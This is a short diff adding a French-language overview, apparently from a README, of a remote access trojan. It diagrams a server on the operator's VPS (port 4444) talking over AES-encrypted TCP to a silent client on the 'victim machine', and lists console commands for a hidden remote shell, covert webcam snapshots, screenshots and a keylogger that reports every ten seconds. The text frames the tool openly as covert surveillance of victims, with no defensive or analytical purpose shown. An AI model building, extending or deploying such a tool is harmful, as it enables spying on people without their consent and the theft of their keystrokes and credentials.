@@ -1,0 +1,13 @@
+┌─────────────┐        AES-256-CBC / TCP        ┌──────────────────┐
+│  server.py  │ ◄──────────────────────────────► │   client.py      │
+│  (ton VPS)  │                                  │ (machine victime)│
+│  port 4444  │                                  │ silencieux       │
+└─────────────┘                                  └──────────────────┘
+      │
+      │  console interactive
+      ▼
+  list              → liste les clients connectés
+  shell <id> <cmd>  → shell distant, CREATE_NO_WINDOW, sortie renvoyée
+  cam   <id>        → snapshot caméra → sauvée en .jpg chez toi
+  screen <id>       → screenshot → sauvée en .png chez toi
+  keylog            → flush automatique toutes les 10s vers server
